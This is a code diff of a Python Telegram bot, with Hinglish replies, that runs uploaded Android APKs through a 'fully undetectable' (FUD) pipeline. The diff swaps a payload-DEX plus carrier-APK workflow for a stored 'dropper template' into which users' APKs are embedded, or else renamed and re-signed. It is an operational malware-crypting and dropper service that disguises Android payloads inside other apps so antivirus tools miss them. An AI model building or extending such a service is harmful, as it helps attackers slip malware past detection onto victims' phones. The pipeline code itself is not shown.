@@ -13,7 +13,7 @@ from telegram.ext import (
 )
 from telegram.error import Conflict
 
-from config import BOT_TOKEN, WORK_DIR
+from config import BOT_TOKEN, WORK_DIR, TEMPLATE_APK
 from pipeline import full_fud_pipeline, full_fud_pipeline_dropper, ensure_tools
 from setup import _setup_done, _setup_error
 
@@ -59,29 +59,46 @@ async def _heartbeat(status, stop_event, prefix, session_dir):
 
 
 async def handle_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    tpl = "SET" if os.path.exists(TEMPLATE_APK) else "NOT SET"
     await update.message.reply_text(
-        "🤖 *FUD APK Bot*\n\n"
-        "• APK bhejo → FUD APK milega\n"
-        "• /dropper + DEX → phir APK → dropper\n\n"
-        "First run pe tools auto-download (2-5 min).",
+        f"🤖 *FUD Bot*\n\n"
+        f"Template: `{tpl}`\n\n"
+        f"• `/template` caption ke saath APK → dropper template set\n"
+        f"• Normal APK bhejo → agar template set hai to usme embed ho jayega\n"
+        f"• Template ke bina → package rename + sign only",
         parse_mode="Markdown",
     )
+
+
+async def handle_template(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = update.message
+    doc = msg.document if msg else None
+    if not doc or not doc.file_name.endswith(".apk"):
+        await msg.reply_text("❌ `.apk` bhejo caption `/template` ke saath.")
+        return
+    os.makedirs(WORK_DIR, exist_ok=True)
+    tmp = TEMPLATE_APK + ".part"
+    tg_file = await context.bot.get_file(doc.file_id)
+    await tg_file.download_to_drive(tmp)
+    os.replace(tmp, TEMPLATE_APK)
+    size = os.path.getsize(TEMPLATE_APK)
+    await msg.reply_text(f"✅ Template saved ({size} bytes).\nAb normal APK bhejo.")
 
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message
     doc = msg.document if msg else None
     if not doc or not doc.file_name.endswith(".apk"):
-        await msg.reply_text("❌ Sirf .apk file bhejo.")
+        await msg.reply_text("❌ Sirf .apk bhejo.")
         return
 
     session_id = str(uuid.uuid4())[:8]
     session_dir = os.path.join(WORK_DIR, session_id)
     os.makedirs(session_dir, exist_ok=True)
     input_path = os.path.join(session_dir, "input.apk")
-    output_path = os.path.join(session_dir, "fud_output.apk")
+    output_path = os.path.join(session_dir, "out.apk")
 
-    status = await msg.reply_text("⚙️ APK download ho raha hai...")
+    status = await msg.reply_text("⚙️ APK download...")
     stop_hb = asyncio.Event()
 
     try:
@@ -89,13 +106,11 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await tg_file.download_to_drive(input_path)
         size_mb = os.path.getsize(input_path) / (1024 * 1024)
 
-        await status.edit_text(f"🔧 Tools check... (APK {size_mb:.1f} MB)")
+        await status.edit_text(f"🔧 Tools... (APK {size_mb:.1f} MB)")
         hb_task = asyncio.create_task(
-            _heartbeat(status, stop_hb, "🔧 Tools check...", session_dir)
+            _heartbeat(status, stop_hb, "🔧 Tools...", session_dir)
         )
-
         await asyncio.to_thread(ensure_tools)
-
         stop_hb.set()
         try:
             await hb_task
@@ -104,12 +119,21 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         stop_hb = asyncio.Event()
         hb_task = asyncio.create_task(
-            _heartbeat(status, stop_hb, "🧬 Processing APK...", session_dir)
+            _heartbeat(status, stop_hb, "🧬 Processing...", session_dir)
         )
 
-        await asyncio.to_thread(
-            full_fud_pipeline, input_path, output_path, session_dir
-        )
+        if os.path.exists(TEMPLATE_APK):
+            await asyncio.to_thread(
+                full_fud_pipeline_dropper,
+                TEMPLATE_APK, input_path, output_path, session_dir,
+            )
+            out_name = "dropper.apk"
+        else:
+            await asyncio.to_thread(
+                full_fud_pipeline,
+                input_path, output_path, session_dir,
+            )
+            out_name = "fud.apk"
 
         stop_hb.set()
         try:
@@ -119,8 +143,8 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await status.edit_text("📤 Uploading...")
         with open(output_path, "rb") as f:
-            await msg.reply_document(document=f, filename="fud_ready.apk")
-        await status.edit_text("✅ FUD APK ready!")
+            await msg.reply_document(document=f, filename=out_name)
+        await status.edit_text("✅ Ready!")
     except Exception as e:
         tb = traceback.format_exc()
         print(tb, flush=True)
@@ -137,90 +161,26 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = update.message
-    doc = msg.document if msg else None
-    if not doc:
-        return
-
-    fname = doc.file_name or ""
-    session_id = str(uuid.uuid4())[:8]
-    session_dir = os.path.join(WORK_DIR, session_id)
-    os.makedirs(session_dir, exist_ok=True)
-
-    try:
-        tg_file = await context.bot.get_file(doc.file_id)
-
-        if fname.endswith(".dex"):
-            dst = os.path.join(WORK_DIR, "last_payload.dex")
-            await tg_file.download_to_drive(dst)
-            context.user_data["payload_dex"] = dst
-            await msg.reply_text("✅ Payload DEX stored. Ab carrier APK bhejo.")
-            return
-
-        if fname.endswith(".apk"):
-            payload = context.user_data.get("payload_dex")
-            if not payload or not os.path.exists(payload):
-                await msg.reply_text("❌ Pehle payload.dex bhejo (caption: /dropper).")
-                return
-
-            input_path = os.path.join(session_dir, "carrier.apk")
-            output_path = os.path.join(session_dir, "dropper.apk")
-
-            status = await msg.reply_text("⚙️ Carrier download...")
-            await tg_file.download_to_drive(input_path)
-
-            await status.edit_text("🔧 Tools check...")
-            await asyncio.to_thread(ensure_tools)
-
-            stop_hb = asyncio.Event()
-            hb_task = asyncio.create_task(
-                _heartbeat(status, stop_hb, "🧬 Building dropper...", session_dir)
-            )
-
-            await asyncio.to_thread(
-                full_fud_pipeline_dropper,
-                input_path, payload, output_path, session_dir,
-            )
-
-            stop_hb.set()
-            try:
-                await hb_task
-            except Exception:
-                pass
-
-            with open(output_path, "rb") as f:
-                await msg.reply_document(document=f, filename="dropper.apk")
-            await status.edit_text("✅ Dropper ready!")
-            return
-
-        await msg.reply_text("❌ Sirf .apk ya .dex.")
-    except Exception as e:
-        tb = traceback.format_exc()
-        print(tb, flush=True)
-        try:
-            await msg.reply_text(f"❌ Error:\n`{str(e)[:400]}`", parse_mode="Markdown")
-        except Exception:
-            pass
-    finally:
-        shutil.rmtree(session_dir, ignore_errors=True)
+    # kept for compatibility — routes to normal handler
+    await handle_apk(update, context)
 
 
 async def run_bot():
-    print("[*] waiting for tools before polling...", flush=True)
+    print("[*] waiting for tools ...", flush=True)
     while not _setup_done.is_set():
         await asyncio.sleep(2)
     if _setup_error["exc"]:
-        print(f"[!] setup failed, bot starting anyway: {_setup_error['exc']}", flush=True)
-    print("[✓] tools ready, starting polling...", flush=True)
+        print(f"[!] setup error: {_setup_error['exc']}", flush=True)
+    print("[✓] tools ready, polling ...", flush=True)
 
     await asyncio.sleep(3)
 
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", handle_start))
-    app.add_handler(CommandHandler("dropper", handle_dropper_apk))
+    app.add_handler(CommandHandler("template", handle_template))
     app.add_handler(MessageHandler(
-        filters.Document.ALL & filters.CaptionRegex(r"^/dropper"),
-        handle_dropper_apk,
+        filters.Document.ALL & filters.CaptionRegex(r"^/template"),
+        handle_template,
     ))
     app.add_handler(MessageHandler(
         filters.Document.FileExtension("apk"),
@@ -241,13 +201,13 @@ async def run_bot():
                 allowed_updates=Update.ALL_TYPES,
                 drop_pending_updates=False,
             )
-            print("🤖 Bot polling active.", flush=True)
+            print("🤖 polling active.", flush=True)
             break
         except Conflict as e:
-            print(f"[!] conflict: {e}. retry 10s", flush=True)
+            print(f"[!] conflict: {e}, retry 10s", flush=True)
             await asyncio.sleep(10)
         except Exception as e:
-            print(f"[!] polling err: {e}. retry 5s", flush=True)
+            print(f"[!] poll err: {e}, retry 5s", flush=True)
             await asyncio.sleep(5)
 
     await asyncio.Event().wait()
@@ -272,7 +232,7 @@ def main():
     try:
         loop.run_until_complete(run_bot())
     except KeyboardInterrupt:
-        print("🛑 Stopped.", flush=True)
+        print("🛑 stopped.", flush=True)
     finally:
         loop.close()
 
